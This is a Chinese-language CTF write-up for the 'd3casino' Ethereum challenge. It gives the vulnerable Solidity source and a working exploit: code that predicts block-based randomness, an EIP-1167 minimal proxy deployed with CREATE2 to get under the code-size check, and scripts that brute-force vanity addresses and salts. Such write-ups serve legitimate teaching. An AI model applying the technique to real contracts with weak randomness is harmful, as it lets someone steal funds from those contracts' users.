# d3casino

## 题目简述

题目是以太坊智能合约 misc。`bet()` 的随机数来自 `block.timestamp`、`block.difficulty` 和 `msg.sender`，可由合约内同步预测；但调用者合约代码大小必须不超过 100 字节，且得分与 `msg.sender` 和 `tx.origin` 地址中相同位置的 leading zero 字节数量相关。解法用 vanity EOA 找 `tx.origin` 前导零，再用 EIP-1167 minimal proxy + CREATE2 生成前导零代理地址，代理转发到实际预测合约。

## 解题过程

10 支队伍解出。

**源码**

```
pragma solidity 0.8.17;
contract D3Casino{
    uint256 constant mod = 17;
    uint256 constant SAFE_GAS = 10000;
    uint256 public lasttime;
    mapping(address => uint256) public scores;
    mapping(address => bool) public betrecord;
    event SendFlag();
    constructor() {
        lasttime = block.timestamp;
    }
    function bet() public {
        require(lasttime != block.timestamp, "You can only bet once per block");
        require(
            betrecord[msg.sender] == false,
            "You can only bet once per contract"
        );
        assembly {
            let size := extcodesize(caller())
            if gt(size, 0x64) {
                invalid()
            }
        }
        lasttime = block.timestamp;
        betrecord[msg.sender] = true;
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(block.timestamp, block.difficulty, msg.sender)
            )
        ) % mod;
        uint256 value;
        bool success;
        bytes memory result;
        (success, result) = msg.sender.staticcall{gas: SAFE_GAS}("");
        require(success, "Call failed!");
        value = abi.decode(result, (uint256));
        if (rand == value) {
            uint256 score;
            for (uint i = 0; i < 20; i++) {
                if (bytes20(msg.sender)[i] == 0 && bytes20(tx.origin)[i] == 0) {
                    score++;
                }
            }
            scores[tx.origin] += score;
        } else {
            scores[tx.origin] = 0;
        }
    }
    function Solve() public {
        require(
            scores[msg.sender] >= 10,
            "You Don't Have Enough Score To Solve The Challenge"
        );
        emit SendFlag();
    }
}
```

### 分析

预测智能合约中的随机数并不困难，关键是如何部署一个代码大小不超过 100 字节、且地址中有多个 leading zero 的合约。

本题设计目的是让选手体验以太坊智能合约中两种节省 gas 的技术。现实中很多 DeFi 协议也会使用这些技术来节省 gas。

### 最小代理（minimal proxy）

EIP-1167 minimal proxy 的关键内容是定义一段极短的代理 runtime bytecode，通过 `DELEGATECALL` 把所有调用转发给实现合约。它适合本题是因为代理合约代码很短，可以满足 `extcodesize(caller()) <= 0x64` 的限制，同时复杂逻辑放在实现合约中。

Solidity-by-example 的 minimal proxy 示例补充了 CREATE/CREATE2 部署代理的实用写法：拼接固定 prefix、实现合约地址和 suffix 得到 EIP-1167 creation code，再用 `create2` 通过 salt 预测并枚举代理地址。

**前导零（leading zeros）**

Efficient Ethereum addresses 文章的核心思想是：合约地址或 EOA 地址前导零越多，某些 EVM 操作和 calldata 表示就可能更省 gas；地址生成可以通过不断枚举私钥或 CREATE2 salt 来碰撞前导零。本题把这个“前导零地址”变成计分条件。

最初我打算让选手生成一个有 10 个 leading zero 的地址，但这太机械了，所以改成 2 个 leading zero，并循环 10 次。

### 解法

### 获取靓号 EOA 地址

```
while True:
    if account.address.startswith("0x00"):
        print("Address: " + account.address)
        print("Private Key: " + account.privateKey.hex())
        break
    account = w3.eth.account.create()
```

### 利用合约

```
contract miniHacker {
    uint256 constant mod = 17;
    fallback(bytes calldata) external returns (bytes memory) {
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.difficulty,
                    address(this)
                )
            )
        ) % mod;
        return abi.encode(rand);
    }
    function hack(address victim) public {
        victim.call(abi.encodeWithSignature("bet()"));
    }
}
```

### 最小代理 + CREATE2

```
contract exploitcontract {
    D3Casino public victim;
    miniHacker public hacker;
    constructor(address _addr){
        victim = D3Casino(_addr);
        hacker = new miniHacker();
    }
    function Clone(
        address target,
        uint256 salt
    ) internal returns (address result) {
        bytes20 targetBytes = bytes20(target);
        assembly {
            let clone := mload(0x40)
            mstore(
                clone,
 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000
            )
            mstore(add(clone, 0x14), targetBytes)
            mstore(
                add(clone, 0x28),
 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000
            )
            result := create2(0, clone, 0x37, salt)
        }
    }
    function testHack(uint256 salt) public {
        address proxy = Clone(address(hacker), salt);
        proxy.call(abi.encodeWithSignature("hack(address)", address(victim)));
    }
}
```

### 爆破 salt

```
from web3 import Web3
from eth_utils import to_checksum_address
from pwnlib.util.iters import mbruteforce
implement_addr = '0x0366eE856529CEfA600EC99745165e84aE59bc39'[2:].lower()
depolyer_addr = '0x5DCb4608296852073f769BF5a1A0639Cd0D84B8D'
perfix = '3d602d80600a3d3981f3363d3d373d3d3d363d73'
suffix = '5af43d82803e903d91602b57fd5bf3'
creation_code = perfix + implement_addr + suffix
def compute_create2(address, salt, creation_code):
    pre = '0xff'
    b_pre = bytes.fromhex(pre[2:])
    b_address = bytes.fromhex(address[2:])
    b_salt = bytes.fromhex(salt)
    b_init_code = bytes.fromhex(creation_code)
    keccak_b_init_code = Web3.keccak(b_init_code)
    b_result = Web3.keccak(b_pre + b_address + b_salt + keccak_b_init_code)
    result_address = to_checksum_address(b_result[12:].hex())
    return result_address
mbruteforce(
    lambda x: compute_create2(depolyer_addr, x.zfill(64),
creation_code).startswith('0x00'),
    '0123456789abcdef',
    length = 6,
)
```

## 方法总结

- 核心技巧：链上弱随机预测、`extcodesize` 代码长度限制绕过、EIP-1167 minimal proxy、CREATE2 地址预计算、vanity address 前导零枚举。
- 识别信号：随机数只依赖当前区块字段和调用者地址时，合约内可同步计算；合约大小限制通常可以用 minimal proxy 把逻辑转发到实现合约。
- 复用要点：外链的必要信息是 minimal proxy 的短 bytecode 结构和 CREATE2 地址公式；本题需要同时让 EOA 和 proxy 地址都带前导零，才能累计足够分数。
